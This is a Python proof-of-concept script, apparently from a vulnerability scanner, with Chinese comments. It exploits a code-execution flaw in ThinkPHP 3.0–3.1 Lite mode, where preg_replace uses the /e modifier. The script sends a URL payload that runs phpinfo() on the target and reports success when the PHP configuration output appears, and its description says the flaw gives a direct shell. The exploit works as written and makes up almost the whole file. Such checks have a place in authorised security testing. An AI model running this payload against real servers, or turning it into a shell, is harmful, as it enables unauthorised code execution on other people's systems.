#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ThinkPHP 代码执行漏洞
referer: http://zone.wooyun.org/index.php?do=view&id=44
author: Lucifer
description: ThinkPHP 版本3.0~3.1开启Lite模式后preg_replace使用了/e选项，同时第二个参数使用双引号，所以造成了代码执行，可直接GETSHELL
'''
import sys
import requests
import warnings
from termcolor import cprint

class thinkphp_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"Configuration File (php.ini) Path" in req.text:
                cprint("[+]存在ThinkPHP 代码执行漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "ThinkPHP 代码执行漏洞", str(payload), req.text
            else:
                cprint("[-]不存在thinkphp_code_exec漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = thinkphp_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()